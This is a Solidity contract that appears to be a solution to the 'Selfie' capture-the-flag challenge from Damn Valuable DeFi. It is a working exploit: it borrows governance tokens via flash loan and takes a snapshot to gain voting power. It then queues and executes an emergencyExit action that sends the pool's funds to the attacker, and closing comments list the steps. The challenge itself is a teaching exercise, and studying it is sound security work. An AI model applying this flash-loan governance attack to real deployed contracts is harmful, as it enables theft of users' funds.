// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol";
//Change 3
import "../DamnValuableTokenSnapshot.sol";


interface ISelfiePool {
    function flashLoan(
        IERC3156FlashBorrower _receiver,
        address _token,
        uint256 _amount,
        bytes calldata _data
    ) external  returns (bool);
}

interface ISimpleGovernance {
    function queueAction(address target, uint128 value, bytes calldata data) external returns (uint256 actionId);
    function executeAction(uint256 actionId) external payable returns (bytes memory);    
}

interface IToken {
    function snapshot() external;
    function transfare(address to, uint256 amount) external;
    function balanceOf(address owner) external returns(uint256);
}




contract  SelfieAttackOld is IERC3156FlashBorrower{

    ISelfiePool pool;
    ISimpleGovernance governance;
    DamnValuableTokenSnapshot token;
    address attacker;
    //Change 4
    uint256 public amount = 1500000 ether;

    //Change 3
    // IToken token;
    uint proposalId;

    constructor(address _pool, address _governace, address _token, address _player){
        attacker = _player;
        pool = ISelfiePool(_pool);
        governance = ISimpleGovernance(_governace);
        token = DamnValuableTokenSnapshot(_token);  
        //Change 3
        // token = IToken(_token);        
    }


    function getLoan() external {
        // uint balance = token.balanceOf(address(pool));
        pool.flashLoan(IERC3156FlashBorrower(address(this)), address(token), amount, bytes(""));
        // Change 1
        // pool.flashLoan(this, address(token), balance, bytes(""));
    }

    function onFlashLoan(
        address ,
        address ,
        uint256 _amount,
        uint256 ,
        bytes calldata 
    ) external returns (bytes32){
        token.snapshot();
        uint128 balance = uint128(token.balanceOf(address(pool)));
        bytes memory emergencyExitData = abi.encodeWithSignature("emergencyExit(address)", address(attacker));
        proposalId = governance.queueAction(address(pool), balance, emergencyExitData);
        token.approve(address(pool), _amount);
        //Change 2
        // token.transfare(address(pool), amount);

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function executeProposal() external {
        governance.executeAction(proposalId);
    }




    // borrow all tokens
    // make a snapshot
    // make a proposal to send all funds to me
   // => queueAction
    // let two day pass 
    // executeAction
}